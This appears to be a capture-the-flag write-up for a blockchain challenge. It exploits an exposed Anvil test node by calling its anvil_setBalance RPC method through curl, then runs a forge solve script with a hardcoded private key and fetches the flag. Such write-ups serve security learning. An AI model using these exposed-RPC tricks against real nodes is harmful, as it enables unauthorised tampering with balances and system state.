# TOOTB

## Solution

The solution is at the end quite simple. The fresh junior dev miss the fact that network made for testing, like anvil, had specifics rpc commands. These specifics rpc commands are useful to set the test network in a special state.

Usually, these rpc commands are blocked to prevent this type of issue in CTF, but not everytime, maybe you can check next time, you could be surprise.

Here you could use the commands : 

`curl <RPC_URL> anvil_setBalance <addr> <value>`

This is curl example : 

`curl http://localhost:8545 -X POST -H "Content-Type: application/json" --data '{"method":"anvil_setBalance","params":["0xE7616f8F030A611be722A7787Ce183FD78B941C9", "0x21E27C1806E59A40000"],"id":1,"jsonrpc":"2.0"}'`

## Get the flag

In the `forge` command, the `--slow` parameter makes sure each transaction has been successfully executed before proceeding to another one

*Make sure you change the address of the challenge in `script/Solve.s.sol`*

```sh
TARGET_IP='127.0.0.1:8000' # to replace
PRIVATE_KEY='0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb'
forge script script/Solve.s.sol --tc 'Solve' --broadcast --private-key $PRIVATE_KEY --rpc-url http://${TARGET_IP}/rpc --skip-simulation --slow
curl -s "http://${TARGET_IP}/flag"
```
